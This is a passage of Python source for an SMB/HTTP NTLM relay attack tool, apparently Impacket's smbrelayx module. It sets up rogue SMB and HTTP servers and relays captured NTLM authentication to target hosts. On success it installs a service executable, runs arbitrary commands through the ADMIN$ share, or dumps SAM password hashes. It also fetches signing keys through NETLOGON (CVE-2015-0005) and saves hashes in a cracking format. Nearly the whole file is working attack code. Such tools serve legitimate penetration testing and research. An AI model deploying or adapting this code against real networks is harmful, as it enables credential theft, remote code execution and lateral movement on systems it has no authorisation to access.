#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Module
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#             This module performs the SMB Relay attacks originally discovered
# by cDc. It receives a list of targets and for every connection received it 
# will choose the next target and try to relay the credentials. Also, if
# specified, it will first to try authenticate against the client connecting 
# to us.
# 
# It is implemented by invoking a SMB and HTTP Server, hooking to a few 
# functions and then using the smbclient portion. It is supposed to be 
# working on any LM Compatibility level. The only way to stop this attack 
# is to enforce on the server SPN checks and or signing.
# 
# If the target system is enforcing signing and a machine account was provided, 
# the module will try to gather the SMB session key through 
# NETLOGON (CVE-2015-0005)
#
# If the authentication against the targets succeed, the client authentication 
# success as well and a valid connection is set against the local smbserver. 
# It's up to the user to set up the local smbserver functionality. One option 
# is to set up shares with whatever files you want to the victim thinks it's 
# connected to a valid SMB server. All that is done through the smb.conf file or 
# programmatically.
#

import ConfigParser
import SimpleHTTPServer
import SocketServer
import argparse
import base64
import logging
import os
import sys
from urlparse import urlparse
from binascii import unhexlify, hexlify
from struct import pack, unpack
from threading import Thread

from impacket import version
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.examples import logger
from impacket.examples import serviceinstall
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections, SOCKS
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
from impacket.nt_errors import ERROR_MESSAGES
from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_NOT_SUPPORTED, \
    STATUS_MORE_PROCESSING_REQUIRED
from impacket.ntlm import NTLMAuthChallengeResponse, NTLMAuthNegotiate, NTLMAuthChallenge, AV_PAIRS, \
    NTLMSSP_AV_HOSTNAME, generateEncryptedSessionKey
from impacket.smb import NewSMBPacket, SMBCommand, SMB, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Extended_Data, \
    SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Extended_Response_Data, \
    SMBSessionSetupAndX_Parameters, SMBSessionSetupAndX_Extended_Parameters, TypesMech, \
    SMBSessionSetupAndXResponse_Parameters, SMBSessionSetupAndXResponse_Data
from impacket.smb3 import SMB3
from impacket.smbconnection import SMBConnection
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile, SMBSERVER
from impacket.spnego import ASN1_AID, SPNEGO_NegTokenResp, SPNEGO_NegTokenInit

try:
 from Cryptodome.Cipher import DES, AES, ARC4
except Exception:
    logging.critical("Warning: You don't have any crypto installed. You need pycryptodomex")
    logging.critical("See https://pypi.org/project/pycryptodomex/")

# Global Variables
# This is the list of hosts that have been attacked already in case -one-shot was chosen
ATTACKED_HOSTS = set()
CODEC = sys.getdefaultencoding()

class doAttack(Thread):
    def __init__(self, SMBClient, exeFile, command):
        Thread.__init__(self)

        if isinstance(SMBClient, SMB) or isinstance(SMBClient, SMB3):
            self.__SMBConnection = SMBConnection(existingConnection = SMBClient)
        else:
            self.__SMBConnection = SMBClient

        self.__exeFile = exeFile
        self.__command = command
        self.__answerTMP = ''
        if exeFile is not None:
            self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)

    def __answer(self, data):
        self.__answerTMP += data

    def run(self):
        # Here PUT YOUR CODE!
        global ATTACKED_HOSTS
        if self.__exeFile is not None:
            result = self.installService.install()
            if result is True:
                logging.info("Service Installed.. CONNECT!")
                self.installService.uninstall()
            else:
                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
        else:
            from impacket.examples.secretsdump import RemoteOperations, SAMHashes
            samHashes = None
            try:
                # We have to add some flags just in case the original client did not
                # Why? needed for avoiding INVALID_PARAMETER
                flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
                flags2 |= SMB.FLAGS2_LONG_NAMES
                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)

                remoteOps  = RemoteOperations(self.__SMBConnection, False)
                remoteOps.enableRegistry()
            except Exception, e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                # Something wen't wrong, most probably we don't have access as admin. aborting
                logging.error(str(e))
                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
                return

            try:
                if self.__command is not None:
                    remoteOps._RemoteOperations__executeRemote(self.__command)
                    logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
                    self.__answerTMP = ''
                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                    logging.debug('Raw answer %r' % self.__answerTMP)

                    try:
                        print self.__answerTMP.decode(CODEC)
                    except UnicodeDecodeError, e:
                        logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                      'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
                                  'again with -codec and the corresponding codec')
                        print self.__answerTMP

                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                else:
                    bootKey = remoteOps.getBootKey()
                    remoteOps._RemoteOperations__serviceDeleted = True
                    samFileName = remoteOps.saveSAM()
                    samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                    samHashes.dump()
                    logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
            except Exception, e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
                logging.error(str(e))
            finally:
                if samHashes is not None:
                    samHashes.finish()
                if remoteOps is not None:
                    remoteOps.finish()
            try:
                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
            except Exception, e:
                logging.error(str(e))
                pass


class SMBClient(SMB):
    def __init__(self, remote_name, extended_security = True, sess_port = 445):
        self._extendedSecurity = extended_security
        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None

        SMB.__init__(self,remote_name, remote_name, sess_port = sess_port)

    def neg_session(self):
        neg_sess = SMB.neg_session(self, extended_security = self._extendedSecurity)
        return neg_sess

    def setUid(self,uid):
        self._uid = uid

    def login_standard(self, user, domain, ansiPwd, unicodePwd):
        smb = NewSMBPacket()
        smb['Flags1']  = 8
        
        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Data()

        sessionSetup['Parameters']['MaxBuffer']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']      = 2
        sessionSetup['Parameters']['VCNumber']         = os.getpid()
        sessionSetup['Parameters']['SessionKey']       = self._dialects_parameters['SessionKey']
        sessionSetup['Parameters']['AnsiPwdLength']    = len(ansiPwd)
        sessionSetup['Parameters']['UnicodePwdLength'] = len(unicodePwd)
        sessionSetup['Parameters']['Capabilities']     = SMB.CAP_RAW_MODE

        sessionSetup['Data']['AnsiPwd']       = ansiPwd
        sessionSetup['Data']['UnicodePwd']    = unicodePwd
        sessionSetup['Data']['Account']       = str(user)
        sessionSetup['Data']['PrimaryDomain'] = str(domain)
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)

        self.sendSMB(smb)
        smb = self.recvSMB()
        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except:
            logging.error("Error login_standard")
            return None, STATUS_LOGON_FAILURE
        else:
            self._uid = smb['Uid']
            return smb, STATUS_SUCCESS

    def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
        self.machineAccount = machineAccount
        self.machineHashes = machineHashes
        self.domainIp = domainIp
        if self._SignatureRequired is True:
            if self.domainIp is None:
                logging.error("Signature is REQUIRED on the other end, attack will not work")
            else:
                logging.info("Signature is REQUIRED on the other end, using NETLOGON approach")


    def netlogonSessionKey(self, challenge, authenticateMessageBlob):
        # Here we will use netlogon to get the signing session key
        logging.info("Connecting to %s NETLOGON service" % self.domainIp)

        respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
        authenticateMessage = NTLMAuthChallengeResponse()
        authenticateMessage.fromString(respToken2['ResponseToken'] )
        _, machineAccount = self.machineAccount.split('/')
        domainName = authenticateMessage['domain_name'].decode('utf-16le')

        try:
            av_pairs = authenticateMessage['ntlm'][44:]
            av_pairs = AV_PAIRS(av_pairs)

            serverName = av_pairs[NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
        except:
            # We're in NTLMv1, not supported
            return STATUS_ACCESS_DENIED

        stringBinding = r'ncacn_np:%s[\PIPE\netlogon]' % self.domainIp

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if len(self.machineHashes) > 0:
            lmhash, nthash = self.machineHashes.split(':')
        else:
            lmhash = ''
            nthash = ''

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(machineAccount,'', domainName, lmhash, nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', '12345678')

        serverChallenge = resp['ServerChallenge']

        if self.machineHashes == '':
            ntHash = None
        else:
            ntHash = unhexlify(self.machineHashes.split(':')[1])

        sessionKey = nrpc.ComputeSessionKeyStrongKey('', '12345678', serverChallenge, ntHash)

        ppp = nrpc.ComputeNetlogonCredential('12345678', sessionKey)

        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00',
                                      ppp, 0x600FFFFF)

        clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)

        # Now let's try to verify the security blob against the PDC

        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = '\x00'
        request['ComputerName'] = serverName + '\x00'
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4

        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage[
            'user_name'].decode('utf-16le')
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = challenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']

        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
        authenticator['Timestamp'] = 10

        request['Authenticator'] = authenticator
        request['ReturnAuthenticator']['Credential'] = '\x00'*8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0
        #request.dump()
        try:
            resp = dce.request(request)
            #resp.dump()
        except DCERPCException, e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            return e.get_error_code()

        logging.info("%s\\%s successfully validated through NETLOGON" % (
        domainName, authenticateMessage['user_name'].decode('utf-16le')))
 
        encryptedSessionKey = authenticateMessage['session_key']
        if encryptedSessionKey != '':
            signingKey = generateEncryptedSessionKey(
                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
        else:
            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey'] 

        logging.info("SMB Signing key: %s " % hexlify(signingKey))

        self.set_session_key(signingKey)

        self._SignatureEnabled = True
        self._SignSequenceNumber = 2
        self.set_flags(flags1 = SMB.FLAGS1_PATHCASELESS, flags2 = SMB.FLAGS2_EXTENDED_SECURITY)
        return STATUS_SUCCESS

    def sendAuth(self, serverChallenge, authenticateMessageBlob):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired: 
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = self._uid

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        sessionSetup['Parameters']['SecurityBlobLength'] = len(authenticateMessageBlob)
        sessionSetup['Data']['SecurityBlob'] = str(authenticateMessageBlob)
        smb.addCommand(sessionSetup)
        self.sendSMB(smb)
            
        smb = self.recvSMB()
        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']

        if errorCode == STATUS_SUCCESS and self._SignatureRequired is True and self.domainIp is not None:
            try:
                errorCode = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)    
            except:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                raise

        return smb, errorCode

    def sendNegotiate(self, negotiateMessage):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired: 
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
          

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        blob = SPNEGO_NegTokenInit() 

        # NTLMSSP
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        blob['MechToken'] = str(negotiateMessage)

        sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob']       = blob.getData()

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        self.sendSMB(smb)
        smb = self.recvSMB()

        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except Exception:
            logging.error("SessionSetup Error!")
            raise
        else:
            # We will need to use this uid field for all future requests/responses
            self._uid = smb['Uid']

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])

            return respToken['ResponseToken']

class HTTPRelayServer(Thread):
    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile,
                     one_shot, returnStatus=STATUS_SUCCESS, runSocks = False):
            self.target = target
            self.exeFile = exeFile
            self.command = command
            self.mode = mode
            self.returnStatus = returnStatus
            self.outputFile = outputFile
            self.one_shot = one_shot
            self.runSocks = runSocks

            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)

    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
        def __init__(self,request, client_address, server):
            self.server = server
            self.protocol_version = 'HTTP/1.1'
            self.challengeMessage = None
            self.target = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None

            global ATTACKED_HOSTS
            if self.server.target in ATTACKED_HOSTS and self.server.one_shot:
                logging.info(
                    "HTTPD: Received connection from %s, skipping %s, already attacked" % (
                    client_address[0], self.server.target))
                return

            if self.server.target is not None:
                logging.info(
                    "HTTPD: Received connection from %s, attacking target %s" % (client_address[0], self.server.target))
            else:
                logging.info(
                    "HTTPD: Received connection from %s, attacking target %s" % (client_address[0], client_address[0]))
            SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)

        def handle_one_request(self):
            try:
                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
            except:
                pass

        def log_message(self, format, *args):
            return

        def do_HEAD(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_AUTHHEAD(self, message = ''):
            self.send_response(401)
            self.send_header('WWW-Authenticate', message)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length','0')
            self.end_headers()

        def send_error(self, code, message=None):
            if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
                return self.do_GET()
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_error(self,code,message)

        def do_GET(self):
            messageType = 0
            if self.headers.getheader('Authorization') is None:
                self.do_AUTHHEAD(message = 'NTLM')
                pass
            else:
                #self.do_AUTHHEAD()
                typeX = self.headers.getheader('Authorization')
                try:
                    _, blob = typeX.split('NTLM')
                    token =  base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD()
                messageType = unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 1:
                if self.server.mode.upper() == 'REFLECTION':
                    self.target = self.client_address[0]
                else:
                    self.target = self.server.target
                try:
                    if self.client is not None:
                        logging.error('Still performing an attack against %s' % self.client.get_remote_host())
                        self.send_response(404)
                        self.end_headers()
                        return

                    self.client = SMBClient(self.target, extended_security = True)
                    self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
                    self.client.set_timeout(60)
                except Exception, e:
                   logging.error("Connection against target %s FAILED" % self.target)
                   logging.error(str(e))

                clientChallengeMessage = self.client.sendNegotiate(token) 
                self.challengeMessage = NTLMAuthChallenge()
                self.challengeMessage.fromString(clientChallengeMessage)
                self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(clientChallengeMessage))

            elif messageType == 3:

                authenticateMessage = NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
                if authenticateMessage['user_name'] != '' or self.target == '127.0.0.1':
                    respToken2 = SPNEGO_NegTokenResp()
                    respToken2['ResponseToken'] = str(token)
                    clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'],
                                                                     respToken2.getData())
                else:
                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
                    # when coming from localhost
                    errorCode = STATUS_ACCESS_DENIED

                if errorCode != STATUS_SUCCESS:
                    logging.error("Authenticating against %s as %s\%s FAILED" % (
                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
                    self.do_AUTHHEAD('NTLM')
                else:
                    # Relay worked, do whatever we want here...
                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (
                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
                    ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    logging.info(ntlm_hash_data['hash_string'])
                    if self.server.outputFile is not None:
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.outputFile)

                    # Target will be attacked, adding to the attacked set
                    # If the attack fails, the doAttack thread will be responsible of removing it from the set
                    global ATTACKED_HOSTS
                    if self.target not in ATTACKED_HOSTS:
                        ATTACKED_HOSTS.add(self.target)
                        if self.server.runSocks is True:
                            # Pass all the data to the socksplugins proxy
                            protocolClient = SMBRelayClient(None,urlparse('smb://%s' % self.target))
                            protocolClient.session = SMBConnection(existingConnection=self.client)
                            activeConnections.put(
                                (self.target, 445, 'SMB', ('%s/%s' % (
                                authenticateMessage['domain_name'].decode('utf-16le'),
                                authenticateMessage['user_name'].decode('utf-16le'))).upper(),
                                 protocolClient,
                                 {'CHALLENGE_MESSAGE': self.challengeMessage}))
                            logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
                        else:
                            clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
                            self.client = None
                            clientThread.start()
                    else:
                        logging.error('%s is being attacker at the moment, skipping.. ' % self.target)

                    # And answer 404 not found
                    self.send_response(404)
                    self.send_header('WWW-Authenticate', 'NTLM')
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Content-Length','0')
                    self.end_headers()
            return 

    def __init__(self, outputFile=None):
        Thread.__init__(self)
        self.daemon = True
        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None
        self.exeFile = None
        self.command = None
        self.target = None
        self.mode = None
        self.outputFile = outputFile
        self.one_shot = False
        self.runSocks = False

    def setTargets(self, target):
        self.target = target

    def setExeFile(self, filename):
        self.exeFile = filename

    def setCommand(self, command):
        self.command = command

    def setSocks(self, socks):
        self.runSocks = socks

    def setReturnStatus(self, returnStatus):
        # Not implemented yet.
        pass

    def setMode(self,mode, one_shot):
        self.mode = mode
        self.one_shot = one_shot

    def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
        self.machineAccount = machineAccount
        self.machineHashes = machineHashes
        self.domainIp = domainIp

    def run(self):
        logging.info("Setting up HTTP Server")
        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode,
                                self.outputFile, self.one_shot, runSocks = self.runSocks)
        httpd.serve_forever()

class SMBRelayServer(Thread):
    def __init__(self, outputFile = None):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        self.target = '' 
        self.mode = 'REFLECTION'
        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None
        self.exeFile = None
        self.returnStatus = STATUS_SUCCESS
        self.command = None
        self.one_shot = False
        self.runSocks = False

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','smb.log')
        smbConfig.set('global','credentials_file','')

        if outputFile is not None:
            smbConfig.set('global','jtr_dump_path',outputFile)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        self.server = SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        self.server.processConfigFile()

        self.origSmbComNegotiate = self.server.hookSmbCommand(SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(SMB.SMB_COM_SESSION_SETUP_ANDX,
                                                                  self.SmbSessionSetupAndX)
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        self.server.addConnection('SMBRelay', '0.0.0.0', 445)

    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        if self.mode.upper() == 'REFLECTION':
            self.target = connData['ClientIP']
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]

        # Let's check if we already attacked this host.
        global ATTACKED_HOSTS
        if self.target in ATTACKED_HOSTS and self.one_shot is True:
            logging.info("SMBD: Received connection from %s, skipping %s, already attacked" % (
            connData['ClientIP'], self.target))
            packet = NewSMBPacket()
            packet['Flags1'] = SMB.FLAGS1_REPLY
            packet['Flags2'] = SMB.FLAGS2_NT_STATUS
            packet['Command'] = recvPacket['Command']
            packet['Pid'] = recvPacket['Pid']
            packet['Tid'] = recvPacket['Tid']
            packet['Mid'] = recvPacket['Mid']
            packet['Uid'] = recvPacket['Uid']
            packet['Data'] = '\x00\x00\x00'
            errorCode = STATUS_NOT_SUPPORTED
            packet['ErrorCode'] = errorCode >> 16
            packet['ErrorClass'] = errorCode & 0xff

            return None, [packet], STATUS_NOT_SUPPORTED
        else:
            logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))

        try: 
            if recvPacket['Flags2'] & SMB.FLAGS2_EXTENDED_SECURITY == 0:
                extSec = False
            else:
                if self.mode.upper() == 'REFLECTION':
                    # Force standard security when doing reflection
                    logging.info("Downgrading to standard security")
                    extSec = False
                    recvPacket['Flags2'] += (~SMB.FLAGS2_EXTENDED_SECURITY)
                else:
                    extSec = True
            client = SMBClient(self.target, extended_security = extSec)
            client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
            client.set_timeout(60)
        except Exception, e:
            logging.error("Connection against target %s FAILED" % self.target)
            logging.error(str(e))
        else: 
            encryptionKey = client.get_encryption_key()
            smbData[self.target] = {}
            smbData[self.target]['SMBClient'] = client
            if encryptionKey is not None:
                connData['EncryptionKey'] = encryptionKey
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)
        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def SmbSessionSetupAndX(self, connId, smbServer, smbCommand, recvPacket):

        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        global ATTACKED_HOSTS

        if connData['_dialects_parameters']['Capabilities'] & SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = SMBSessionSetupAndX_Extended_Response_Parameters()
            respData       = SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = SMBSessionSetupAndX_Extended_Parameters(smbCommand['Parameters'])
            sessionSetupData = SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(smbCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            if unpack('B',sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
               # If there no GSSAPI ID, it must be an AUTH packet
               blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
               token = blob['ResponseToken']
            else:
               # NEGOTIATE packet
               blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
               token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the 
            # authentication we are, we act on it
            messageType = unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client. 
                # Let's send it to the target server and send the answer back to the client.

                # Let's check if we already attacked this host.
                global ATTACKED_HOSTS
                if self.target in ATTACKED_HOSTS and self.one_shot is True:
                    logging.info("SMBD: Received connection from %s, skipping %s, already attacked" % (
                    connData['ClientIP'], self.target))
                    packet = NewSMBPacket()
                    packet['Flags1'] = SMB.FLAGS1_REPLY
                    packet['Flags2'] = SMB.FLAGS2_NT_STATUS
                    packet['Command'] = recvPacket['Command']
                    packet['Pid'] = recvPacket['Pid']
                    packet['Tid'] = recvPacket['Tid']
                    packet['Mid'] = recvPacket['Mid']
                    packet['Uid'] = recvPacket['Uid']
                    packet['Data'] = '\x00\x00\x00'
                    errorCode = STATUS_NOT_SUPPORTED
                    packet['ErrorCode'] = errorCode >> 16
                    packet['ErrorClass'] = errorCode & 0xff

                    return None, [packet], STATUS_NOT_SUPPORTED

                # It might happen if the target connects back before a previous connection has finished, we might
                # get to this function w/o having the dict and smbClient entry created, because a
                # NEGOTIATE_CONNECTION was not needed
                if smbData.has_key(self.target) is False:
                    smbData[self.target] = {}
                    smbClient = SMBClient(self.target)
                    smbClient.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
                    smbClient.set_timeout(60)
                    smbData[self.target]['SMBClient'] = smbClient

                smbClient = smbData[self.target]['SMBClient']
